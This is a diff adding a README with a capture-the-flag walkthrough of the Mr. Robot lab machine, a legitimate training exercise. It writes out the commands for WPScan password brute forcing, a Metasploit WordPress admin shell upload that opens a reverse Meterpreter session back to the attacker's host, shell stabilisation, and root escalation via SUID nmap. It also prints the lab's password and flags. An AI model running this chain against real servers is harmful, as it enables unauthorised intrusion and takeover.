@@ -1,0 +1,67 @@
+# Mr. Robot CTF Walkthrough - TryHackMe / VulnHub
+
+This repository contains a detailed step-by-step walkthrough of the **Mr. Robot CTF**. The goal of this challenge is to find 3 hidden keys (flags) by navigating through different stages of penetration testing.
+
+## 🛡️ Executive Summary
+*   **Target IP:** 192.168.56.122
+*   **Difficulty:** Medium
+*   **Goal:** Obtain 3 flags and gain root access.
+*   **Tools Used:** WPScan, Metasploit, Python, Nmap (SUID).
+
+---
+
+## 🛠️ Phase 1: Reconnaissance & Web Attack
+After initial scanning, I discovered a WordPress login page and a wordlist hint in `robots.txt`.
+
+### 1. Brute Forcing WordPress
+Using the discovered username `elliot` and a filtered wordlist, I performed a brute-force attack.
+```bash
+sudo wpscan --url [http://192.168.56.122/wp-login.php](http://192.168.56.122/wp-login.php) -U 'elliot' -P fsocity_filterd.dic
+Result: Password found: ER28-0652
+
+🚀 Phase 2: Exploitation (Gaining Access)
+With valid credentials, I used Metasploit to upload a reverse shell via a malicious plugin.
+
+1. Metasploit Configuration
+Bash
+use exploit/unix/webapp/wp_admin_shell_upload
+set RHOSTS 192.168.56.122
+set LHOST 192.168.56.103
+set USERNAME elliot
+set PASSWORD ER28-0652
+set wpcheck false
+exploit
+Result: Successfully opened a Meterpreter session as user daemon.
+
+2. TTY Shell Stabilization
+To get a fully interactive terminal, I used Python:
+
+Bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+🔑 Phase 3: Horizontal Privilege Escalation
+Found an MD5 hash in /home/robot/password.raw-md5.
+
+Hash: robot:c3fcd3d76192e4007dfb496cca67e13b
+
+Decrpyted: abcdefghijklmnopqrstuvwxyz
+
+Bash
+su robot
+# Entered the cracked password
+cat /home/robot/key-2-of-3.txt
+Flag 2 Found: 822c73956184f694993bede3eb39f959
+
+⚡ Phase 4: Vertical Privilege Escalation (Root)
+I searched for SUID binaries to escalate my privileges to root.
+
+Bash
+find / -perm -u=s -type f 2>/dev/null
+I discovered that Nmap (v3.81) had the SUID bit set.
+
+1. Exploiting Nmap SUID
+Nmap's interactive mode allows executing system commands with root privileges.
+
+Bash
+nmap --interactive
+nmap> !cat /root/key-3-of-3.txt
+Flag 3 Found (Final): 04787ddef27c3dee1ee161b21670b4e4
